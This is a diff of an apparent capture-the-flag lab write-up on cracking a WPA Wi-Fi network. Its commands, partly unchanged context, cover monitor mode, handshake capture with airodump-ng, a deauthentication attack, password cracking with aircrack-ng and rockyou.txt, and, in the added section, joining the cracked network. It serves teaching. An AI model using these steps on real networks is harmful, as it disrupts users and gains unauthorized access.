@@ -97,11 +97,10 @@ glitch@wifi:~$ sudo iw dev wlan2 set type monitor # change wlan2 to monitor mode
 glitch@wifi:~$ sudo ip link set dev wlan2 up # turn our device back on
 ```
 
-We can confirm that our interface is in monitor mode with the command `sudo iw dev wlan2 info`.\
+We can confirm that our interface is in monitor mode with the command `sudo iw dev wlan2 info`
 
 **Note:** By default, `airodump-ng` will automatically switch the selected wireless interface into monitor mode if the interface supports it.
-
-1st Terminal
+#### Premise for deauth attack (1st Terminal)
 
 we start by capturing Wi-Fi traffic in the area, specifically targeting the WPA handshake packets
 
@@ -116,8 +115,7 @@ sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2 # This comm
 **Note** that the `STATION` section shows the device's BSSID (MAC) of `02:00:00:00:01:00` that is connected to the access point.
 
 goal of this command is to capture the 4-way handshake. It will first check for any clients that may be connected to the access point. If a client is already connected, then we can perform a deauthentication attack; otherwise, for any new client that connects, we will capture the 4-way handshake.
-
-2nd Terminal 
+#### launch the deauthentication attack (2nd terminal)
 
 We will launch the deauthentication attack. Because the client is already connected, we want to force them to reconnect to the access point, forcing it to send the handshake packets
 
@@ -140,6 +138,15 @@ sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*ca
 
 > **Note:** If you get an `Packets contained no EAPOL data; unable to process this AP` error, this means that you ran aircrack-ng prior to the handshake being captured or that the handshake was not captured at all.
 
+#### Joining the network
 
+ we can now join the **MalwareM_AP** access point.
+
+```shell
+glitch@wifi:~$ wpa_passphrase MalwareM_AP 'ENTER PSK HERE' > config
+glitch@wifi:~$ sudo wpa_supplicant -B -c config -i wlan2
+```
+
+**Note:** If you get a `rfkill: Cannot get wiphy information` error, you can ignore it. You will also notice that `wpa_supplicant` has automatically switched our **wlan2** interface to **managed mode**.
 ### References
 Day 11
